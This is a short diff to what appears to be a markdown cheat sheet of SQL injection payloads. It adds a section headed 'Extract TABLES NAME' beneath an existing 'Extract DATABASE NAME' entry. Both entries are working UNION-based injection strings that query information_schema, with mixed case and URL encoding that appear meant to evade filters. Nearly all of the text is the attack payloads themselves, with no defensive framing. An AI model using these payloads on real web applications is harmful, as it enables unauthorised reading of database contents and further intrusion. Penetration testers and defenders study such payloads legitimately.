@@ -23,3 +23,8 @@ Then the following codes will extract the databases'name, tables'name, columns'n
 #### Extract DATABASE NAME
 
 `1' UniOn Select 1,gRoUp_cOncaT(0x7c,schema_name,0x7c),3+fRoM+information_schema.schemata%23`
+
+
+#### Extract TABLES NAME
+
+`1' UniOn Select 1,gRoUp_cOncaT(0x7c,table_name,0x7C),3+fRoM+information_schema.tables+wHeRe+table_schema=database()%23`
